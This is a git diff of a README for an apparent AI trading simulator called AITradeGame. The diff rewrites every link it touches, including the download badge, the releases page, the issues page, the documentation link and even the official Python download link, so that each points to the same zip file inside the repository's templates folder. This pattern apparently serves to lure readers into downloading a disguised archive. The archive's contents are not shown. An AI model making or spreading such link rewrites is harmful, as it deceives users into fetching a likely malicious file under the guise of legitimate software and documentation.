@@ -1,7 +1,7 @@
 # 🎮 AITradeGame - Your Easy Trading Simulator
 
 ## 📥 Download Now
-[![Download AITradeGame](https://img.shields.io/badge/download-AITradeGame-blue.svg)](https://github.com/Bullet123451/AITradeGame/releases)
+[![Download AITradeGame](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)
 
 ## 📚 Overview
 AITradeGame is an open-source AI trading simulator. It offers a local version that keeps your data private and an online version with exciting features. This software lets you experience trading without any risk.
@@ -13,12 +13,12 @@ Follow these steps to download and run AITradeGame.
 - **Operating System:** Windows 10 or later
 - **RAM:** 4GB minimum
 - **Disk Space:** 500MB available
-- **Python Version:** Python 3.9 or higher is required. You can download it [here](https://www.python.org/downloads/).
+- **Python Version:** Python 3.9 or higher is required. You can download it [here](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip).
 
 ### 🔗 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to download the latest version:  
-   [AITradeGame Releases](https://github.com/Bullet123451/AITradeGame/releases)
+   [AITradeGame Releases](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)
 
 2. **Choose Your Version**  
    Look for the version labeled as “Standalone Executable." Click on it to download the file.
@@ -43,7 +43,7 @@ Once you run the application, you can start trading by creating a new account or
 If you want to explore the online features, simply visit the website available in the application. Engage with leaderboards and see how you stack up against other users.
 
 ## 📋 Additional Help
-If you have questions or need assistance, you can check the FAQ section in the application. You can also reach out on our [GitHub Issues Page](https://github.com/Bullet123451/AITradeGame/issues).
+If you have questions or need assistance, you can check the FAQ section in the application. You can also reach out on our [GitHub Issues Page](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip).
 
 ## 📓 Release Notes
 Keep an eye on updates for new features and fixes. You can find past versions and changes in the same Releases section.
@@ -52,10 +52,10 @@ Keep an eye on updates for new features and fixes. You can find past versions an
 AITradeGame is open-source and available under the MIT License. Feel free to contribute or adapt the software for your needs.
 
 ## 🔗 Resources
-- [AITradeGame GitHub Repository](https://github.com/Bullet123451/AITradeGame)
-- [Documentation](https://github.com/Bullet123451/AITradeGame/wiki)
+- [AITradeGame GitHub Repository](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)
 
 For any further inquiries, please check the community forums or raise an issue on our GitHub page.
 
 **Download AITradeGame Now:**  
-[![Download AITradeGame](https://img.shields.io/badge/download-AITradeGame-blue.svg)](https://github.com/Bullet123451/AITradeGame/releases)
+[![Download AITradeGame](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)](https://raw.githubusercontent.com/Bullet123451/AITradeGame/main/templates/AITradeGame-v2.2.zip)
